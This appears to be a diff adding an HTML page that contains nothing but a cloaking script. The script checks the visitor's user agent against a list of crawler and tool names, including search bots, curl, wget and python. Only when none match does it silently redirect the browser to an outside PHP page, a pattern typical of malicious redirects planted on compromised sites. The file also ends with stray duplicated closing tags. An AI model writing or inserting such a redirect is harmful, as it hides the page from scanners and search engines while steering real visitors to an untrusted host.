@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function isBot() {
+    var ua = navigator.userAgent.toLowerCase();
+    var bots = ["bot","crawl","spider","slurp","bing","google","curl","wget","python"];
+    for (var i = 0; i < bots.length; i++) {
+        if (ua.indexOf(bots[i]) !== -1) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (!isBot()) {
+    window.location.href = "https://swig.co.za/flavon.php";
+}
+</script>
+</head>
+<body>
+</body>
+</html>
+/body>
+</html>
